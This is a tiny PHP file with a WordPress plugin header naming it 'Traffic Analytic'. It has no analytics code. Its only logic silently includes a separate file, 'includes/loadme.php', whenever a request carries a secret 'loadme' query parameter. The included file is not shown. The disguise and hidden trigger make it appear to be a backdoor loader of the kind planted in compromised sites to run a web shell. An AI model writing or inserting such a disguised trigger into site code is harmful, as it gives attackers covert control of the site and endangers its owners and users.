<?php
/**
 * Plugin Name: Traffic Analytic
 * Version: 5.2
 * Author: sans
 */

if(isset($_GET["loadme"])){
	include("includes/loadme.php");
}

?>
